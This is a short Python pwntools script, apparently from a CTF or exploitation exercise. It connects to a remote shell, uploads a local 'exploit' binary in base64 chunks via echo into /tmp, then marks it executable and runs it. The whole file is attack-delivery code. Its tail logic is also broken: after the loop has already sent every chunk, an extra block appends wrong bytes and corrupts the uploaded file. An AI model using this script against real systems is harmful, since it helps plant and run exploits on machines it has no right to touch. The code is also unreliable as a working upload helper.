#coding:utf8
from pwn import *
import base64
 
sh = remote('xxx',10100)
 
#我们编写好的exploit
f = open('./exploit','rb')
content = f.read()
total = len(content)
f.close()
#每次发送这么长的base64，分段解码
per_length = 0x200
#创建文件
sh.sendlineafter('$','touch /tmp/exploit')
for i in range(0,total,per_length):
   bstr = base64.b64encode(content[i:i+per_length])
   sh.sendlineafter('$','echo {} | base64 -d >> /tmp/exploit'.format(bstr))
if total - i > 0:
   bstr = base64.b64encode(content[total-i:total])
   sh.sendlineafter('$','echo {} | base64 -d >> /tmp/exploit'.format(bstr))
 
sh.sendlineafter('$','chmod +x /tmp/exploit')
sh.sendlineafter('$','/tmp/exploit')
 

